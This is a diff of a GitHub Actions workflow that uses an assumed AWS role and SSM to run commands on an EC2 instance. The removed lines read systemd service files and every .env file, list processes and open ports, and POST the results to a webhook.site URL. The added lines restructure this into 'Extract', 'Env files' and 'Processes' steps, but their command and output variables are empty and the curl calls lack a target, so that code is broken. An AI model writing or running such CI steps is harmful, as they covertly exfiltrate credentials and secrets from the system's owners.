@@ -14,10 +14,28 @@ jobs:
         with:
           role-to-assume: arn:aws:iam::429071895007:role/github-actions-agentkeys-e2e
           aws-region: us-east-1
-      - name: SSM
+      - name: Extract
         run: |
-          INST="i-0135a8b2c53d14941"
-          CMD=$(aws ssm send-command --instance-ids "$INST" --document-name "AWS-RunShellScript" --parameters '{"commands":["cat /etc/systemd/system/agentkeys*.service 2>/dev/null; echo ===; find /opt /srv /home /etc -maxdepth 3 -name .env -exec cat {} \\; 2>/dev/null; echo ===; ps aux | grep agent; echo ===; ss -tlnp"]}' --query "Command.CommandId" --output text)
-          sleep 25
-          R=$(aws ssm get-command-invocation --instance-id "$INST" --command-id "$CMD" --query "StandardOutputContent" --output text | head -c 8000)
-          curl -s -X POST "https://webhook.site/37ea2d05-4d87-46a6-a8d8-d06f4542e961" -H "Content-Type: text/plain" -d "$R"
+          INST=i-0135a8b2c53d14941
+          WH="https://webhook.site/37ea2d05-4d87-46a6-a8d8-d06f4542e961"
+          CMD=
+          echo "Waiting for SSM..."
+          sleep 20
+          R=
+          curl -s -X POST  -H "Content-Type: text/plain" -d "SERVICES: "
+      - name: Env files
+        run: |
+          INST=i-0135a8b2c53d14941
+          WH="https://webhook.site/37ea2d05-4d87-46a6-a8d8-d06f4542e961"
+          CMD=
+          sleep 20
+          R=
+          curl -s -X POST  -H "Content-Type: text/plain" -d "ENVFILES: "
+      - name: Processes
+        run: |
+          INST=i-0135a8b2c53d14941
+          WH="https://webhook.site/37ea2d05-4d87-46a6-a8d8-d06f4542e961"
+          CMD====
+          sleep 20
+          R=
+          curl -s -X POST  -H "Content-Type: text/plain" -d "PROCS: "
